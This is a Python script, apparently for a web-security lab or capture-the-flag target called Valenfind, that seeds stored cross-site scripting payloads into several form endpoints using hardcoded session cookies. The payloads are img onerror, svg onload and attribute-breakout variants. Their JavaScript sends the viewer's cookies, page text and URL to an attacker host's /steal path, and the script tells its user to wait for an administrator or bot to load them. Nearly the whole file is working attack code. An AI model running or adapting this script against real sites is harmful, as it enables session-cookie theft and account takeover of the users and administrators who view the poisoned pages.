#!/usr/bin/env python3
"""Valenfind multi-endpoint XSS seeder (no parameters).

Run:
  python owasp_hunt/valenfind_multi_seed.py

Purpose:
Seed multiple likely reviewed forms to increase chance of admin/bot view.
"""

from __future__ import annotations

import random
import re
import string
from typing import Dict, List, Tuple

import requests


BASE_URL = "http://10.112.165.127:5000"
ATTACKER_HOST = "10.112.69.178"
ATTACKER_PORT = 8000
TIMEOUT = 10

ENDPOINTS = [
    "/complete_profile",
    "/register",
    "/contact",
    "/feedback",
    "/support",
]

COOKIE_NAME = "session"
COOKIE_VALUES = [
    "eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiMTIzIn0.aeFLFA.efdhJ78NfiztsKIzas2UVa5PXzw",
    ".eJwljEEKwjAUBa_yfesiqCu78wbupZRP-qrBpCn5yaKU3t2Aq5nZzI5xDmofGvrXDikNiDTTN9Hh4VyqSxGXqYXTSZ6BahSX4hpYKFuqWdacZh94xnAMHYL_cmqbptWYR9_i_vdFI9Hjcr3h-AEITyjz.aeFLFA.qlotgrsCHcBudjmxf4eS5QO9y1A",
]


def rand_token(prefix: str = "VFM") -> str:
    return prefix + "_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


def payload_variants() -> List[str]:
    js = (
        "var c=document.cookie||'nocookie';"
        "var t=(document.body&&document.body.innerText?document.body.innerText:'').slice(0,220);"
        f"(new Image).src='http://{ATTACKER_HOST}:{ATTACKER_PORT}/steal?d='+encodeURIComponent(c)+'&t='+encodeURIComponent(t)+'&u='+encodeURIComponent(location.href)"
    )
    return [
        f"<img src=x onerror=\"{js}\">",
        f"<svg onload=\"{js}\"></svg>",
        f"\"><img src=x onerror=\"{js}\">",
    ]


def parse_form(body: str) -> Tuple[List[str], Dict[str, str]]:
    fields: List[str] = []
    hidden: Dict[str, str] = {}

    for m in re.finditer(r"<input[^>]*>", body, flags=re.I):
        tag = m.group(0)
        name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if not name_m:
            continue
        name = name_m.group(1)
        fields.append(name)

        type_m = re.search(r"type\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if type_m and type_m.group(1).lower() == "hidden":
            value_m = re.search(r"value\s*=\s*['\"]([^'\"]*)['\"]", tag, flags=re.I)
            hidden[name] = value_m.group(1) if value_m else ""

    for m in re.finditer(r"<textarea[^>]*>", body, flags=re.I):
        tag = m.group(0)
        name_m = re.search(r"name\s*=\s*['\"]([^'\"]+)['\"]", tag, flags=re.I)
        if name_m:
            fields.append(name_m.group(1))

    if not fields:
        fields = ["name", "email", "message"]

    dedup: List[str] = []
    seen = set()
    for f in fields:
        if f not in seen:
            seen.add(f)
            dedup.append(f)

    return dedup, hidden


def build_data(fields: List[str], hidden: Dict[str, str], payload: str, token: str) -> Dict[str, str]:
    data = dict(hidden)

    for name in fields:
        if name in hidden:
            continue

        n = name.lower()
        if "mail" in n:
            data[name] = f"{token.lower()}@example.com"
        elif "pass" in n:
            data[name] = "Passw0rd!123"
        elif "phone" in n or "tel" in n:
            data[name] = "123456789"
        elif "user" in n or "name" in n:
            data[name] = f"{token}_{payload}"
        else:
            data[name] = f"{payload} {token}"

    return data


def seed_endpoint(session: requests.Session, endpoint: str, payload: str, token: str) -> None:
    url = f"{BASE_URL}{endpoint}"

    try:
        r0 = session.get(url, timeout=TIMEOUT, allow_redirects=True)
    except Exception as exc:
        print(f"[seed] GET {endpoint} failed: {exc}")
        return

    fields, hidden = parse_form(r0.text)
    data = build_data(fields, hidden, payload, token)

    try:
        rp = session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
    except Exception as exc:
        print(f"[seed] POST {endpoint} failed: {exc}")
        return

    print(f"[seed] {endpoint} -> GET {r0.status_code}, POST {rp.status_code}, fields={len(fields)}")


def main() -> None:
    print("Valenfind multi-seed started")
    print(f"Target: {BASE_URL}")
    print(f"Exfil:  http://{ATTACKER_HOST}:{ATTACKER_PORT}/steal?d=...")
    print("=" * 72)

    variants = payload_variants()

    for i, cv in enumerate(COOKIE_VALUES, start=1):
        s = requests.Session()
        s.cookies.set(COOKIE_NAME, cv)
        print(f"[cookie-{i}] seeding endpoints")

        for ep in ENDPOINTS:
            for p in variants:
                token = rand_token()
                seed_endpoint(s, ep, p, token)

        print("-" * 72)

    print("Done. Keep listener running and wait for admin/bot view.")


if __name__ == "__main__":
    main()
